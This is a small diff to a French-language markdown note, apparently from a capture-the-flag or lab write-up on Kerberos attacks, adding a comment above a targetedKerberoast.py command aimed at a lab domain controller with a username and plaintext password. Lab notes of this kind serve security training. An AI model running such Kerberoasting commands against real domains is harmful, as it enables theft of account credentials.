@@ -42,6 +42,7 @@ $krb5asrep$23$user@DOMAIN:...
 
 ref : 
 ```
+# Obtenir les comptes ayant retourné un AS-REP
 python3 targetedKerberoast.py --dc-ip 10.129.41.212 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' 
 ```
 
